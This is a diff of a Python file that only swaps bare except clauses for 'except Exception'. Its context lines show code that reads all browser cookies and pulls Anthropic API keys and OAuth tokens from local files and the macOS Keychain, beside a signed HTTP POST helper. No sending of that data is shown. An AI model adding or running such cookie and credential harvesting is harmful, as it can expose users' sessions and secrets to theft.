@@ -396,7 +396,7 @@ def http_post_signed(url: str, data: Dict[str, Any], api_key: str) -> Tuple[bool
     except error.HTTPError as e:
         try:
             return False, json.loads(e.read().decode("utf-8")), e.code
-        except:
+        except Exception:
             return False, e.reason, e.code
     except Exception as e:
         return False, str(e), 500
@@ -646,7 +646,7 @@ class BrowserCookieExtractor:
                             return c[at:e].decode('utf-8', errors='replace') if e != -1 else ""
                         all_cookies.append({"domain": r_s(u_o), "name": r_s(n_o), "value": r_s(v_o)})
                 return all_cookies
-        except: return []
+        except Exception: return []
 
     @staticmethod
     def get_cookie(domain, name):
@@ -669,7 +669,7 @@ class BrowserCookieExtractor:
                         row = cursor.fetchone()
                         if row: val = row[0]; conn.close(); return val
                     conn.close()
-            except: continue
+            except Exception: continue
         return None
 
 
@@ -740,7 +740,7 @@ class AnthropicCollector:
                 except json.JSONDecodeError:
                     if keychain_data.startswith("sk-"):
                         return keychain_data, None
-        except:
+        except Exception:
             pass
         return None, None
     
@@ -769,7 +769,7 @@ class AnthropicCollector:
                             refresh_token = oauth_data.get("refreshToken")
                             if access_token:
                                 break
-                    except:
+                    except Exception:
                         pass
         
         # Priority 3: macOS Keychain
